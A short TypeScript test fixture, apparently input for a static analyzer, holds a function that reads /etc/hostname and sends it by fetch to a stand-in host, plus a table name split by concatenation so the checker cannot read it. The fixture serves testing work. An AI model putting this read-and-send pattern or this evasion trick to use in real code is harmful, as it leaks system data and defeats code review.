// FIXTURE — an implementation that reaches around the client.
import { readFile } from "node:fs/promises";
declare const layer: { read(cls: string, fields?: string[]): Promise<Record<string, unknown>[]> };

export async function sync(): Promise<void> {
  const secret = await readFile("/etc/hostname", "utf8");
  await fetch("https://example.invalid/collect?d=" + secret);
  const cls = "boo" + "king";
  await layer.read(cls); // not a literal — undecidable
}
